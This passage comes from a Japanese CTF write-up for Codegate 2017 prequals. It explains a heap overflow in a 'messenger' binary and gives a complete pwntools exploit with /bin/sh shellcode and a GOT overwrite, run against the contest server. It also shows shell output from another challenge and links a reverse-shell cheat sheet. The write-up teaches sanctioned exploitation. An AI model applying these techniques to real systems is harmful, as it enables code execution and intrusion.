+<span id="cb8-2"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-3"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb8-3" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
+<pre><code>$ ./exploit2.py
+[+] Opening connection to localhost on port 8181: Done
+[*] leaked canary: 0x6e6b8100
+[*] Switching to interactive mode
+sh-4.4$ $ ls
+ls
+babypwn
+exploit2.py
+exploit.py
+flag.txt
+out
+peda-session-babypwn.txt
+sh-4.4$ $ 
+[*] Closed connection to localhost port 8181</code></pre>
+<h2 id="messenger-205pt">12 messenger <small>(205pt)</small></h2>
+<p>x86-64 の ELF.</p>
+<pre><code>$ file messenger
+messenger: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d8396b1a1f90c3679f6946c3693f93abf4563ba4, stripped
+
+$ checksec messenger
+[*] &#39;/tmp/messenger&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE</code></pre>
+<p>起動するとこんな感じ. 2つまでのメッセージの追加/削除/変更/確認ができる.</p>
+<pre><code>$ ./messenger
+ _ __ ___   ___  ___ ___  ___ _ __   __ _  ___ _ __
+| &#39;_ ` _ \ / _ \/ __/ __|/ _ \ &#39;_ \ / _` |/ _ \ &#39;__|
+| | | | | |  __/\__ \__ \  __/ | | | (_| |  __/ |
+|_| |_| |_|\___||___/___/\___|_| |_|\__, |\___|_|
+                                    |___/
+[L]eave message
+[R]emove message
+[C]hange message
+[V]iew message
+[Q]uit
+&gt;&gt; </code></pre>
+<p>先に書いておくと, この問題は <a href="https://github.com/ctfs/write-ups-2014/blob/master/plaid-ctf-2014/ezhp/README.md" target="_blank" rel="nofollow noopener">Plaid CTF 2014: ezhp</a> に非常に似ていて, <a href="https://gist.github.com/Tosainu/1216f3b74aeff490fef0d0e3e3033671" target="_blank" rel="nofollow noopener">実際に僕が解いたときのスクリプト</a>をこのプログラムに合わせて変更するだけで解くことができた.</p>
+<p>このプログラムは <code>[L]eave message</code> で登録するメッセージの長さを <code>0x20</code> 文字までに制限しているのに対し, <code>[C]hange message</code> では長さのチェックを行なっておらず, しかも変更前の領域にそのまま新しいメッセージを書き込んでいる. メッセージは独自実装の <code>malloc()</code> 的なもので確保された heap 上にあるため, heap buffer overflow が起こせる.</p>
+<p>そこで, 次のような攻撃を行う.<br />
+メッセージを1つ追加したとき, heap はこのような双方向リストになっている. ここで一つのブロックのことを chunk, 前の chunk を指すポインタを <code>bk</code>, 次の chunk を指すポインタを <code>fd</code> と呼ぶことにする.</p>
+<figure>
+<img src="/entry/2017/02/11/codegate-2017-prequals-writeup/heap1.svg" alt="heap1" />
+<figcaption aria-hidden="true">heap1</figcaption>
+</figure>
+<p>ここで1つ目のメッセージを変更して heap bof を起こし, 次の chunk の bk を <code>exit()</code> の GOT のアドレスから8を引いたものに書き換える.</p>
+<figure>
+<img src="/entry/2017/02/11/codegate-2017-prequals-writeup/heap2.svg" alt="heap2" />
+<figcaption aria-hidden="true">heap2</figcaption>
+</figure>
+<p>この状態で2つ目のメッセージの追加するとこのようになり,</p>
+<figure>
+<img src="/entry/2017/02/11/codegate-2017-prequals-writeup/heap3.svg" alt="heap3" />
+<figcaption aria-hidden="true">heap3</figcaption>
+</figure>
+<p>そのまま2つ目のメッセージの削除を行うと, <code>exit()</code> の GOT のアドレスから8を引いたもの以降を1つの chunk として見た時に <code>fd</code> に相当する <code>exit()</code> の GOT を3つ目の chunk のアドレスに書き換えることができる. (図の chunk1, chunk2 の <code>fd</code>, <code>bk</code> が指す要素は, 一応 gdb でも確認しているが正直自信がない. ここでは特に重要でないので気にしないで…)</p>
+<figure>
+<img src="/entry/2017/02/11/codegate-2017-prequals-writeup/heap4.svg" alt="heap4" />
+<figcaption aria-hidden="true">heap4</figcaption>
+</figure>
+<p>あとは3つ目の chunk が作られる予定のアドレス辺りに shellcode が配置されるように1つ目のメッセージを再び変更する. すると <code>exit@plt()</code> が呼び出されたときに shellcode が実行されるようになる.</p>
+<p>実際に作成したスクリプトと実行結果は次の通り.</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
+<span id="cb12-2"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-3"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb12-4"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-5"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="co"># $ objdump -M intel -j .plt -d messenger</span></span>
+<span id="cb12-6"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="co"># ...</span></span>
+<span id="cb12-7"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 0000000000400780 &lt;exit@plt&gt;:</span></span>
+<span id="cb12-8"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="co">#   400780:	ff 25 ea 18 20 00    	jmp    QWORD PTR [rip+0x2018ea]        # 602070 &lt;exit@plt+0x2018f0&gt;</span></span>
+<span id="cb12-9"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="co">#   400786:	68 0b 00 00 00       	push   0xb</span></span>
+<span id="cb12-10"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="co">#   40078b:	e9 30 ff ff ff       	jmp    4006c0 &lt;puts@plt-0x10&gt;</span></span>
+<span id="cb12-11"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="co"># ...</span></span>
+<span id="cb12-12"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-12" aria-hidden="true" tabindex="-1"></a>addr_exit_got <span class="op">=</span> <span class="bn">0x602070</span></span>
+<span id="cb12-13"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-14"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="co"># msf &gt; use payload/linux/x64/exec</span></span>
+<span id="cb12-15"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="co"># msf payload(exec) &gt; generate -b &#39;\x00&#39; -t python -o CMD=/bin/sh</span></span>
+<span id="cb12-16"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-16" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">=</span>  <span class="st">&#39;&#39;</span></span>
+<span id="cb12-17"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-17" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05</span><span class="st">&#39;</span></span>
+<span id="cb12-18"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-18" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\xef\xff\xff\xff\x48\xbb\x80\x51\x84\x63\x84\x7a\x7b</span><span class="st">&#39;</span></span>
+<span id="cb12-19"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-19" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\x73\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="st">&#39;</span></span>
+<span id="cb12-20"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-20" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\xea\x6a\xdc\xfa\xcc\xc1\x54\x11\xe9\x3f\xab\x10\xec</span><span class="st">&#39;</span></span>
+<span id="cb12-21"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-21" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\x7a\x28\x3b\x09\xb6\xec\x4e\xe7\x7a\x7b\x3b\x09\xb7</span><span class="st">&#39;</span></span>
+<span id="cb12-22"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-22" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\xd6\x8b\x8c\x7a\x7b\x73\xaf\x33\xed\x0d\xab\x09\x13</span><span class="st">&#39;</span></span>
+<span id="cb12-23"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-23" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\x73\xd6\x06\xcc\xea\x62\x75\x7e\x73</span><span class="st">&#39;</span></span>
+<span id="cb12-24"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-25"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-25" aria-hidden="true" tabindex="-1"></a><span class="co"># r = process(&#39;./messenger-patched&#39;)</span></span>
+<span id="cb12-26"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-26" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> remote(<span class="st">&#39;110.10.212.137&#39;</span>,  <span class="dv">3333</span>)</span>
+<span id="cb12-27"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-28"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-28" aria-hidden="true" tabindex="-1"></a><span class="co">#  _ __ ___   ___  ___ ___  ___ _ __   __ _  ___ _ __</span></span>
+<span id="cb12-29"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-29" aria-hidden="true" tabindex="-1"></a><span class="co"># | &#39;_ ` _ \ / _ \/ __/ __|/ _ \ &#39;_ \ / _` |/ _ \ &#39;__|</span></span>
+<span id="cb12-30"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-30" aria-hidden="true" tabindex="-1"></a><span class="co"># | | | | | |  __/\__ \__ \  __/ | | | (_| |  __/ |</span></span>
+<span id="cb12-31"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-31" aria-hidden="true" tabindex="-1"></a><span class="co"># |_| |_| |_|\___||___/___/\___|_| |_|\__, |\___|_|</span></span>
+<span id="cb12-32"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-32" aria-hidden="true" tabindex="-1"></a><span class="co">#                                     |___/</span></span>
+<span id="cb12-33"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-33" aria-hidden="true" tabindex="-1"></a><span class="co"># [L]eave message</span></span>
+<span id="cb12-34"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-34" aria-hidden="true" tabindex="-1"></a><span class="co"># [R]emove message</span></span>
+<span id="cb12-35"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-35" aria-hidden="true" tabindex="-1"></a><span class="co"># [C]hange message</span></span>
+<span id="cb12-36"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-36" aria-hidden="true" tabindex="-1"></a><span class="co"># [V]iew message</span></span>
+<span id="cb12-37"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-37" aria-hidden="true" tabindex="-1"></a><span class="co"># [Q]uit</span></span>
+<span id="cb12-38"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-38" aria-hidden="true" tabindex="-1"></a><span class="co"># &gt;&gt;</span></span>
+<span id="cb12-39"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-39" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-40"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-40" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> choose_action(c):</span>
+<span id="cb12-41"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-41" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;[Q]uit</span><span class="ch">\n</span><span class="st">&gt;&gt; &#39;</span>)</span>
+<span id="cb12-42"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-42" aria-hidden="true" tabindex="-1"></a>    r.sendline(c)</span>
+<span id="cb12-43"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-44"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-44" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> leave_message(n, s):</span>
+<span id="cb12-45"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-45" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">&#39;L&#39;</span>)</span>
+<span id="cb12-46"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-46" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;size : &#39;</span>)</span>
+<span id="cb12-47"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-47" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
+<span id="cb12-48"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-48" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;msg : &#39;</span>)</span>
+<span id="cb12-49"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-49" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
+<span id="cb12-50"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-51"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-51" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> remove_message(i):</span>
+<span id="cb12-52"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-52" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">&#39;R&#39;</span>)</span>
+<span id="cb12-53"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-53" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;index : &#39;</span>)</span>
+<span id="cb12-54"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-54" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(i))</span>
+<span id="cb12-55"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-56"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-56" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> change_message(i, n, s):</span>
+<span id="cb12-57"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-57" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">&#39;C&#39;</span>)</span>
+<span id="cb12-58"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-58" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;index : &#39;</span>)</span>
+<span id="cb12-59"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-59" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(i))</span>
+<span id="cb12-60"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-60" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;size : &#39;</span>)</span>
+<span id="cb12-61"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-61" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
+<span id="cb12-62"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-62" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;msg : &#39;</span>)</span>
+<span id="cb12-63"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-63" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
+<span id="cb12-64"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-64" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-65"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-65" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> view_message(i):</span>
+<span id="cb12-66"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-66" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">&#39;V&#39;</span>)</span>
+<span id="cb12-67"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-67" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;index : &#39;</span>)</span>
+<span id="cb12-68"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-68" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(i))</span>
+<span id="cb12-69"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-69" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> r.recvuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">[L]eave&#39;</span>)[:<span class="op">-</span><span class="bu">len</span>(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">[L]eave&#39;</span>)]</span>
+<span id="cb12-70"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-70" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-71"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-71" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> quit():</span>
+<span id="cb12-72"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-72" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">&#39;Q&#39;</span>)</span>
+<span id="cb12-73"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-73" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-74"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-74" aria-hidden="true" tabindex="-1"></a><span class="co"># add 1st message</span></span>
+<span id="cb12-75"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-75" aria-hidden="true" tabindex="-1"></a>leave_message(<span class="dv">4</span>, <span class="st">&#39;AAAA&#39;</span>)</span>
+<span id="cb12-76"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-76" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-77"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-77" aria-hidden="true" tabindex="-1"></a><span class="co"># gdb-peda$ x/50xg 0x603000 &lt;- heap base</span></span>
+<span id="cb12-78"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-78" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603000:	0x0000000000000018	0x0000000000603018</span></span>
+<span id="cb12-79"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-79" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603010:	0x0000000000000000	0x0000000000000031 &lt;- 1st chunk size</span></span>
+<span id="cb12-80"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-80" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603020:	0x0000000000603048	0x0000000000603000 &lt;- fd, bk</span></span>
+<span id="cb12-81"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-81" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603030:	0x0000000041414141	0x0000000000000000</span></span>
+<span id="cb12-82"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-82" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603040:	0x0000000000000000	0x00000000000003d0 &lt;- 2nd chunk size</span></span>
+<span id="cb12-83"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-83" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603050:	0x0000000000000000	0x0000000000603018 &lt;- fd, bk</span></span>
+<span id="cb12-84"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-84" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603060:	0x0000000000000000	0x0000000000000000</span></span>
+<span id="cb12-85"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-85" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-86"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-86" aria-hidden="true" tabindex="-1"></a><span class="co"># resize 1st message and overwite 2nd chunk&#39;s bk</span></span>
+<span id="cb12-87"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-87" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb12-88"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-88" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x18</span></span>
+<span id="cb12-89"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-89" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="bn">0x3d0</span>)               <span class="co"># size</span></span>
+<span id="cb12-90"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-90" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="dv">0</span>)                   <span class="co"># fd</span></span>
+<span id="cb12-91"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-91" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(addr_exit_got <span class="op">-</span> <span class="dv">8</span>)   <span class="co"># bk</span></span>
+<span id="cb12-92"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-92" aria-hidden="true" tabindex="-1"></a>change_message(<span class="dv">0</span>, <span class="bu">len</span>(payload), payload)</span>
+<span id="cb12-93"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-93" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-94"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-94" aria-hidden="true" tabindex="-1"></a><span class="co"># add 2nd message</span></span>
+<span id="cb12-95"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-95" aria-hidden="true" tabindex="-1"></a>leave_message(<span class="dv">4</span>, <span class="st">&#39;AAAA&#39;</span>)</span>
+<span id="cb12-96"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-96" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-97"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-97" aria-hidden="true" tabindex="-1"></a><span class="co"># remove 2nd message</span></span>
+<span id="cb12-98"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-98" aria-hidden="true" tabindex="-1"></a><span class="co"># now, addr_exit_got was overwitten to 3rd chunk&#39;s addr</span></span>
+<span id="cb12-99"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-99" aria-hidden="true" tabindex="-1"></a>remove_message(<span class="dv">1</span>)</span>
+<span id="cb12-100"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-100" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-101"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-101" aria-hidden="true" tabindex="-1"></a><span class="co"># send shellcode</span></span>
+<span id="cb12-102"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-102" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb12-103"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-103" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\x90</span><span class="st">&#39;</span> <span class="op">*</span> <span class="bn">0x100</span></span>
+<span id="cb12-104"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-104" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> shellcode</span>
+<span id="cb12-105"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-105" aria-hidden="true" tabindex="-1"></a>change_message(<span class="dv">0</span>, <span class="bu">len</span>(payload), payload)</span>
+<span id="cb12-106"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-106" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-107"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-107" aria-hidden="true" tabindex="-1"></a><span class="co"># select undefined action to call exit()</span></span>
+<span id="cb12-108"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-108" aria-hidden="true" tabindex="-1"></a>choose_action(<span class="st">&#39;Z&#39;</span>)</span>
+<span id="cb12-109"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-109" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-110"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-110" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
+<pre><code>$ ./exploit.py
+[+] Opening connection to 110.10.212.137 on port 3333: Done
+[*] Switching to interactive mode
+$ ls
+flag
+messenger
+$ cat flag
+1_wan3_y0ur_m3ssenger$%
+$ 
+[*] Closed connection to 110.10.212.137 port 3333</code></pre>
+<h2 id="おわり">おわり</h2>
+<p>解くのは楽しかったけど, 過去問に似た正答者数の多く得点がどんどん下がっていった問題しか解けてないので厳しい…</p>
+<h3 id="参考url">参考URL</h3>
+<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="nofollow noopener">Reverse Shell Cheat Sheet | pentestmonkey</a></li>
+<li><a href="https://speakerdeck.com/bata_24/katagaitai-ctf-number-1" target="_blank" rel="nofollow noopener">katagaitai CTF勉強会 #1 pwnables編 - DEFCON CTF 2014 pwn1 heap / katagaitai CTF #1 // Speaker Deck</a></li>
+</ul>
+<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1" role="doc-endnote"><p><code>stdin</code>, <code>stdout</code> などがプログラムが動いているサーバ側を向いているため.<a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section></div><aside class="comments"><div id="disqus_thread"></div><script>(function() { var d = document, s = d.createElement('script');s.src = 'https://tosainu.disqus.com/embed.js';s.setAttribute('data-timestamp', +new Date());(d.head || d.body).appendChild(s); })();</script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="nofollow noopener">comments powered by Disqus.</a></noscript></aside></div></article></main><footer class="site-footer"><div class="footer-widgets"><div class="container"><div class="col"><section class="about-me"><h4><svg class="svg-inline--fa fa-user fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="user" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0S96 57.3 96 128s57.3 128 128 128zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512H418.3c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304H178.3z" fill="currentColor"></path></svg> About Me</h4><div class="about"><div class="avatar"><img src="/images/icon/cocoa.svg" class="icon" alt="avatar"></div><div class="info"><div class="name"><a href="https://myon.info" target="_blank" rel="nofollow noopener">Tosainu</a></div><div class="info">❤ Arch Linux, ごちうさ</div></div></div></section><section class="recent-posts"><h4><svg class="svg-inline--fa fa-file fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 384 512" data-icon="file" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M0 64C0 28.7 28.7 0 64 0H224V128c0 17.7 14.3 32 32 32H384V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V64zm384 64H256V0L384 128z" fill="currentColor"></path></svg> Recent Posts</h4><ul><li><a href="/entry/2022/09/19/earthly-zynqmp/">とにかく複雑な Zynq のソフトウェアを Earthly でビルドする</a></li><li><a href="/entry/2020/11/29/archlinux-arm-on-zu/">Ultra96 で Arch Linux ARM を動かす</a></li><li><a href="/entry/2020/09/01/thinkpad-x13/">ThinkPad X13 を買いました</a></li><li><a href="/entry/2020/07/05/bus-blaster/">Bus Blaster で Raspberry Pi Model B を JTAG デバッグしてみる</a></li><li><a 